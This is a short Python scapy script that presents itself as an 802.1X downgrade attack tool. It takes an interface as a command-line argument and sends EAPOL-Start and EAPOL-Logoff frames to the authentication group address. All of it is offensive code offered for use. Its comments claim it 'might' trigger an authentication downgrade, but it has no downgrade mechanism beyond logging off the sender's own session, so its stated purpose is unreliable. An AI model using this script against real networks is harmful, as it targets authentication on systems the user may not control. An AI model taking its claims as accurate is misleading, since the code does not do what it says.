#!/usr/bin/env python3

from scapy.all import *
import time

def send_eapol_start(interface):
    """
    Sends an EAPOL-Start packet to initiate the 802.1X authentication process.
    """
    print(f"Sending EAPOL-Start on interface {interface}...")
    
    eapol_start = Ether(dst="01:80:c2:00:00:03") / EAPOL(type=1)
    sendp(eapol_start, iface=interface, verbose=False)

def send_eapol_logoff(interface):
    """
    Sends an EAPOL-Logoff packet to simulate the user logging off, possibly triggering the downgrade.
    """
    print(f"Sending EAPOL-Logoff on interface {interface}...")
    
    eapol_logoff = Ether(dst="01:80:c2:00:00:03") / EAPOL(type=2)
    sendp(eapol_logoff, iface=interface, verbose=False)

def downgrade_attack(interface):
    """
    Attempts to perform the downgrade attack by sending specific packets that might exploit
    misconfigurations or weaknesses in 802.1X authentication.
    """
    try:
        print("Starting 802.1X Downgrade Attack...")

        # Send EAPOL-Start to initiate the authentication process
        send_eapol_start(interface)
        time.sleep(2)

        # Send EAPOL-Logoff to possibly trigger a downgrade
        send_eapol_logoff(interface)
        time.sleep(2)

        # (Optional) Repeat the attack or implement additional downgrade steps here
        
        print("Attack attempt complete. Check if authentication has been downgraded.")
    
    except KeyboardInterrupt:
        print("\nAttack interrupted. Exiting...")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="802.1X Downgrade Attack Script")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use for the attack")

    args = parser.parse_args()

    downgrade_attack(args.interface)